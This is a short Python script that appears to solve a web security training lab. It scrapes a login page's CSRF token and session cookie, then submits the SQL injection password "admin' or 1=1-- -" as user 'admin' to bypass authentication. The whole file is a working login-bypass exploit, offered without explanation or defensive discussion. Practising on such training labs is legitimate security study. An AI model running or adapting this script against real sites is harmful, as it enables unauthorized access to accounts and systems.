#!/usr/bin/python3
##
import requests
import re
import pwn
from bs4 import BeautifulSoup
##
def get_csrf(req):
    s=BeautifulSoup(req.text,'html.parser')
    csrf_temp=s.find_all("input")
    csrf=""
    for X in csrf_temp:
        if "csrf" in str(X):
            csrf=X["value"]
    print(csrf)
    return csrf
#
def main(URL):
    req=requests.get(URL+"login")
    csrf=get_csrf(req)
    session=str(req.headers.get("Set-Cookie")).split(';')[0]
    print(session)
    Payload={"csrf":csrf,
             "username":"admin",
             "password":"admin' or 1=1-- -"}
    r=requests.post(f"{URL}login",data=Payload,headers={"Cookie":session})
    print(r.status_code)
    print(r.request.headers)
#
main('https://0af500970360358b80e0d1c1009300af.web-security-academy.net/')
